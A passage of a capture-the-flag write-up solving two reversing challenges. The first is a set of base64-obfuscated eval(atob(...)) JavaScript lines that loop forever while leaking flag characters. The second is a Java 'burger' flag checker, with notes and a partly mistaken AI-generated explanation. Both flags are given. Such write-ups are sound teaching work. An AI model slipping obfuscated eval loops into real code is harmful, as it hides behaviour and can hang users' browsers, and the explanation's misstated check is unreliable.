KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZERKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZFVKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZEdKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZDdKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZHJKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDY3pKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZEdKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDYzNKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZDZKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZElKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZDlKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2Zvcig7Oyljb25zb2xlLmxvZygia2FibGV3eSIpfSkoKTsK
```

Decoding each of the strings reveals a character of the Flag.

```bash
└─$ echo "d2hpbGUgKHRydWUpIGNvbnNvbGUubG9nKCdrYWJsZXd5Jyk7CnBvc3RNZXNzYWdlKCdMJyk7" | base64 -d
while (true) console.log('kablewy');
postMessage('L');
```

Flag: `LITCTF{k3F7zH}`

### **Burger Reviewer**

Author: `km`

Try to sneak a pizza into the burger reviewer!

Given: `Burgers.java`

```java
import java.util.*;

public class Burgers {

        public static boolean bun(String s) {
                return (s.substring(0, 7).equals("LITCTF{") && s.charAt(s.length()-1) == '}');
        }

        public static boolean cheese(String s) {
                return (s.charAt(13) == '_' && (int)s.charAt(17) == 95 && s.charAt(19) == '_' && s.charAt(26)+s.charAt(19) == 190 && s.charAt(29) == '_' && s.charAt(34)-5 == 90 && s.charAt(39) == '_');
        }

        public static boolean meat(String s) {
                boolean good = true;
                int m = 41;
                char[] meat = {'n', 'w', 'y', 'h', 't', 'f', 'i', 'a', 'i'};
                int[] dif = {4, 2, 2, 2, 1, 2, 1, 3, 3};
                for (int i = 0; i < meat.length; i++) {
                        m -= dif[i];
                        if (s.charAt(m) != meat[i]) {
                                good = false;
                                break;
                        }
                }
                return good;
        }

        public static boolean pizzaSauce(String s) {
                boolean[] isDigit = {false, false, false, true, false, true, false, false, true, false, false, false, false, false};
                for (int i = 7; i < 21; i++) {
                        if (Character.isDigit(s.charAt(i)) != isDigit[i - 7]) {
                                return false;
                        }
                }
                char[] sauce = {'b', 'p', 'u', 'b', 'r', 'n', 'r', 'c'};
                int a = 7; int b = 20; int i = 0; boolean good = true;
                while (a < b) {
                        if (s.charAt(a) != sauce[i] || s.charAt(b) != sauce[i+1]) {
                                good = false;
                                break;
                        }
                        a++; b--; i += 2;
                        while (!Character.isLetter(s.charAt(a))) a++;
                        while (!Character.isLetter(s.charAt(b))) b--;
                }
                return good;
        }

        public static boolean veggies(String s) {
                int[] veg1 = {10, 12, 15, 22, 23, 25, 32, 36, 38, 40};
                int[] veg = new int[10];
                for (int i = 0; i < veg1.length; i++) {
                        veg[i] = Integer.parseInt(s.substring(veg1[i], veg1[i]+1));
                }
                return (veg[0] + veg[1] == 14 && veg[1] * veg[2] == 20 && veg[2]/veg[3]/veg[4] == 1 && veg[3] == veg[4] && veg[3] == 2 && veg[4] - veg[5] == -3 && Math.pow(veg[5], veg[6]) == 125 && veg[7] == 4 && veg[8] % veg[7] == 3 && veg[8] + veg[9] == 9 && veg[veg.length - 1] == 2);
        }

        public static void main(String[] args) {
                Scanner in = new Scanner(System.in);
                System.out.println("Can burgers be pizzas? Try making a burger...");
                System.out.print("Enter flag: ");
                String input = in.next();
                in.close();

                boolean gotFlag = true;

                if (input.length() > 42) {
                        System.out.println("This burger iz too big :(");
                } else if (input.length() < 42) {
                        System.out.println("This burger iz too small :(");
                } else {
                        if (!bun(input)) {
                                System.out.println("Wrong bun >:0");
                                gotFlag = false;
                        }

                        if (gotFlag) {
                                if (!cheese(input)) {
                                        System.out.println("Hmph. Not good chez :/");
                                        gotFlag = false;
                                }
                        }

                        if (gotFlag) {
                                if (!meat(input)) {
                                        System.out.println("Bah, needs better meat :S");
                                        gotFlag = false;
                                }
                        }

                        if (gotFlag) {
                                if (!pizzaSauce(input)) {
                                        System.out.println("Tsk tsk. You call that pizza sauce? >:|");
                                        gotFlag = false;
                                }
                        }

                        if (gotFlag) {
                                if (!veggies(input)) {
                                        System.out.println("Rotten veggies, ew XP");
                                        gotFlag = false;
                                }
                        }

                        if (gotFlag) {
                                System.out.println("Yesyes good burger :D");
                        }
                }
        }
}
```

Quite an interesting challenge, we are given flag checker program that has a total of 6 check functions to pass the challenge. I took the manual approach in reversing the challenge. Here’s a snippet of my notes.

```
LITCTF{     _   _ _ i  a _if_th y_w n _  }

LITCTF{bur9e0_c4n_b_pi  a _if_th y_w n _  }

LITCTF{bur9er5_c4n_b2_pi25a_if_th3y_w1n4_72}

LITCTF{b12_4r_pi22a5nif_th3yZw4n7_2}

digit 1 = 9, 5, 4, 2, 2, 5, 3, 1, 4

s[13] = '_'
s[17] = '_'
s[19] = '_'
s[26] = '_'
s[29] = '_'
s[34] = '_'
s[39] = '_'

10, 12, 15 = digits

s[37] = 'n'
s[35] = 'w'
s[33] = 'y'
s[31] = 'h'
s[30] = 't'
s[28] = 'f'
s[27] = 'i'
s[24] = 'a'
s[21] = 'i'
```

After a help from `@PattuSai` , we were able to solve this challenge. Seriously I’m a bit lazy now, so I’ll let GPT do the job, TBH it does pretty good.

Here's how this flag is constructed based on the program:

1. **Bun check:** The flag starts with `LITCTF{` and ends with `}`.
2. **Cheese check:**
    - `s[13]`, `s[17]`, `s[19]`, `s[26]`, `s[29]`, `s[34]`, `s[39]` are all underscores `_`.
    - Additional conditions:
        - `s[26] + s[19] == 190` (ASCII values)
        - `s[34] + 5 == 95` (which implies `s[34] == '_'`)
3. **Meat check:** The string `'n', 'w', 'y', 'h', 't', 'f', 'i', 'a', 'i'` corresponds to positions in the flag derived from the logic, confirming the characters in the correct positions.
4. **Pizza sauce check:** The flag checks that certain positions have digits, and matches corresponding characters `{'b', 'p', 'u', 'b', 'r', 'n', 'r', 'c'}`.
5. **Veggies check:** The digits at positions calculated using the conditions provided confirm the flag structure.

Flag: `LITCTF{bur9r5_c4n_b_pi22a5_if_th3y_w4n7_2}`
